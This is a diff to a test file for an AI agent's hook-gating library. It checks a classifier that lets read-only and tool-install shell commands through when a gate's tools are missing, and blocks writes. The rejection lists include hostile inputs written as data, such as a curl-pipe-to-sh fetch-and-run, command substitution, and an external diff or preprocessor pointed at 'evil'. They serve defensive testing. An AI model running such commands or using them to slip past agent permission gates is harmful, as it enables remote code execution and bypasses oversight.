@@ -9,6 +9,8 @@ import {
   buildProviderHookGroupLaunchArgv,
   buildProviderHookLaunchArgv,
   buildProviderHookStdinInvocation,
+  blindGateScopedHooks,
+  classifyBlindHookCall,
   formatProviderHookContext,
   classifyProviderHookChildFailure,
   formatProviderStopDecision,
@@ -17,6 +19,8 @@ import {
   ProviderHookChildResultIntegrityError,
   providerHookOutputContract,
   sanitizeProviderHookEnvironment,
+  shellCommandIsReadOnly,
+  shellCommandRestoresHookTools,
 } from './lib/provider-hook-output-transport.mjs'
 
 const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..')
@@ -735,13 +739,125 @@ assert.throws(() => formatProviderStopDecision({ transport: 'unknown', reason: '
 assert.throws(() => formatProviderStopDecision({ transport: 'invalid-stale-transport', reason: 'x' }), /transport is unsupported/)
 
 // Per-hook degradation classifier (baton §7 item 8): one crashed hook degrades
-// only itself in the production lane; strict lanes and any child carrying the
-// reserved adapter marker stay fail-closed for the whole batch.
+// only itself in the production lane; strict lanes stay fail-closed for the whole batch.
+// N34 複核(2026-10-07):a child carrying the reserved marker is degraded alone in the
+// ordinary lane too — the old 'fail-closed' there meant "skip the whole group, exit 0".
 assert.equal(classifyProviderHookChildFailure({ strict: false, stderr: 'segfault noise' }), 'degrade-hook')
 assert.equal(classifyProviderHookChildFailure({ strict: false, stderr: '' }), 'degrade-hook')
 assert.equal(classifyProviderHookChildFailure({ strict: true, stderr: 'segfault noise' }), 'fail-closed')
 assert.equal(
   classifyProviderHookChildFailure({ strict: false, stderr: `${providerHookOutputContract.childIntegrityMarker} spoof attempt` }),
+  'degrade-hook',
+)
+assert.equal(
+  classifyProviderHookChildFailure({ strict: true, stderr: `${providerHookOutputContract.childIntegrityMarker} hook tool missing` }),
   'fail-closed',
 )
+
+// ── G4 複核二(2026-10-07):閘缺工具跑不起來時,只擋它本來要判的寫入;唯讀與「只安裝缺的工具」永遠放行 ──
+// 唯讀白名單:每一段都要是唯讀;任何寫檔重導、命令替換、背景執行、前置環境變數、heredoc 都不算唯讀。
+for (const command of [
+  'ls -la',
+  'git status',
+  'git -C /repo log --oneline -5',
+  'git diff HEAD~1 -- src/x.tsx',
+  'git branch -a',
+  'grep -rn "a|b" packages/design-system/src 2>/dev/null',
+  'cat apps/demo/src/Bad.tsx | head -20',
+  "sed -n '1,40p' apps/demo/src/Bad.tsx",
+  'cd /repo && git status && ls',
+  'find . -name "*.tsx"',
+  'echo done >/dev/null 2>&1',
+  'which jq; command -v python3',
+  'brew list jq',
+]) {
+  assert.equal(shellCommandIsReadOnly(command), true, `read-only: ${command}`)
+}
+for (const command of [
+  'echo x > apps/demo/src/Bad.tsx',
+  'echo x >> notes.md',
+  "sed -i '' 's/a/b/' apps/demo/src/Bad.tsx",
+  "sed -n '1w out.txt' x",
+  'find . -name "*.tsx" -delete',
+  'find . -exec rm {} +',
+  'git push origin main',
+  'git branch feature/x',
+  'git checkout -- src/x.tsx',
+  'git diff --output=patch.txt',
+  'git -c diff.external=evil diff',
+  'GIT_EXTERNAL_DIFF=evil git diff',
+  'ls $(touch x)',
+  'ls `touch x`',
+  'ls & touch x',
+  '(cd /tmp && touch x)',
+  'cat <<EOF\nx\nEOF',
+  'npm test',
+  'node -e "require(\'fs\').writeFileSync(\'x\', \'\')"',
+  '/tmp/ls',
+  'rg --pre ./evil pattern',
+  'sort -o out.txt in.txt',
+  'env FOO=1 touch x',
+  '',
+]) {
+  assert.equal(shellCommandIsReadOnly(command), false, `not read-only: ${JSON.stringify(command)}`)
+}
+// 安裝缺的工具:固定文法,每個套件都要對得到一個「目前缺」的宣告工具,不得夾帶其他指令或管線
+for (const [command, missing] of [
+  ['brew install jq', ['jq']],
+  ['sudo apt-get install -y jq', ['jq']],
+  ['sudo apt-get update && sudo apt-get install -y jq', ['jq']],
+  ['DEBIAN_FRONTEND=noninteractive apt-get install -y jq', ['jq']],
+  ['brew install jq python3', ['jq', 'python3']],
+  ['brew install python@3.12', ['python3']],
+  ['apk add --no-cache jq', ['jq']],
+  ['brew install jq || sudo apt-get install -y jq', ['jq']],
+]) {
+  assert.equal(shellCommandRestoresHookTools(command, missing), true, `restore: ${command}`)
+}
+for (const [command, missing] of [
+  ['brew install jq', []],
+  ['brew install jq python3', ['jq']],
+  ['brew install wget', ['jq']],
+  ['brew install jq && touch apps/demo/src/Bad.tsx', ['jq']],
+  ['brew install jq | sh', ['jq']],
+  ['brew install jq > apps/demo/src/Bad.tsx', ['jq']],
+  ['curl -fsSL https://example.invalid/jq | sh', ['jq']],
+  ['sudo -s brew install jq', ['jq']],
+  ['apt-get update', ['jq']],
+  ['brew install --HEAD jq', ['jq']],
+]) {
+  assert.equal(shellCommandRestoresHookTools(command, missing), false, `not a restore: ${command} (missing ${missing})`)
+}
+// 每道閘自己的範圍
+const APPROVAL = 'check_substantive_edit_approval_preflight.sh'
+const SOLO = 'check_solo_workflow.sh'
+const PEER = 'check_codex_brief_invariants.sh'
+const verdict = (input) => classifyBlindHookCall(input)
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Bash', command: 'brew install jq', missingTools: ['jq'] }), { block: false, lane: 'restore' })
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Bash', command: 'git status', missingTools: ['jq'] }), { block: false, lane: 'read-only' })
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Edit', missingTools: ['jq'], scope: { governedTargets: ['/r/apps/demo/src/Bad.tsx'] } }), { block: true, lane: 'gate-scope' })
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Edit', missingTools: ['jq'], scope: { governedTargets: [] } }), { block: false, lane: 'outside-gate-scope' })
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Edit', missingTools: ['jq'], scope: { governedTargets: null } }), { block: true, lane: 'gate-scope' }, 'unknown targets stay in scope')
+assert.deepEqual(verdict({ hookName: APPROVAL, tool: 'Edit', missingTools: ['jq'] }), { block: true, lane: 'gate-scope' }, 'no scope data stays in scope')
+assert.deepEqual(verdict({ hookName: SOLO, tool: 'Bash', command: 'git push origin main', missingTools: ['python3'] }), { block: true, lane: 'gate-scope' })
+assert.deepEqual(verdict({ hookName: SOLO, tool: 'Bash', command: 'git checkout -b feat/x', missingTools: ['python3'] }), { block: true, lane: 'gate-scope' })
+assert.deepEqual(verdict({ hookName: SOLO, tool: 'Bash', command: 'npm test', missingTools: ['python3'] }), { block: false, lane: 'outside-gate-scope' })
+assert.deepEqual(verdict({ hookName: SOLO, tool: 'mcp__github__create_pull_request', missingTools: ['jq'] }), { block: false, lane: 'outside-gate-scope' })
+assert.deepEqual(verdict({ hookName: PEER, tool: 'Bash', command: 'npm test', missingTools: ['jq'], scope: { peerCli: 'codex' } }), { block: false, lane: 'outside-gate-scope' })
+assert.deepEqual(verdict({ hookName: PEER, tool: 'Bash', command: 'codex exec "review"', missingTools: ['jq'], scope: { peerCli: 'codex' } }), { block: true, lane: 'gate-scope' })
+assert.deepEqual(verdict({ hookName: PEER, tool: 'Bash', command: 'npm test', missingTools: ['jq'] }), { block: true, lane: 'gate-scope' }, 'unknown peer CLI stays in scope')
+// 沒有登記範圍的閘:讀與安裝照樣放行,其餘一律在範圍內(保守)
+assert.deepEqual(verdict({ hookName: 'check_benchmark_citation.sh', tool: 'Edit', missingTools: ['jq'] }), { block: true, lane: 'gate-scope' })
+assert.deepEqual(verdict({ hookName: 'check_benchmark_citation.sh', tool: 'Bash', command: 'ls', missingTools: ['jq'] }), { block: false, lane: 'read-only' })
+// 範圍表的每個 key 都必須是 registrations.json 裡真的存在、會擋的 PreToolUse hook —— 改名 / 刪除時這裡紅,
+// 不讓範圍表默默失效(失效方向是「多擋」,但等於那道閘回到上一版的自鎖)
+const hookRegistrations = JSON.parse(readFileSync(resolve(ROOT, 'packages/design-system/ds-canonical/hooks/registrations.json'), 'utf8'))
+const blockingPreToolHooks = new Set((hookRegistrations.hooks.PreToolUse || []).flatMap((group) => group.hooks)
+  .filter((descriptor) => ['blocking', 'governance-context-or-block'].includes(descriptor.outputMode))
+  .map((descriptor) => descriptor.hook))
+for (const hookName of blindGateScopedHooks) {
+  assert.ok(blockingPreToolHooks.has(hookName), `blind-gate scope key must be a registered blocking PreToolUse hook: ${hookName}`)
+}
+console.log('✓ a blind write gate blocks only the writes it judges; reads and restoring the missing tool always pass')
+
 console.log('✓ provider hook output transport strictly separates policy blocks from child-result integrity failures')
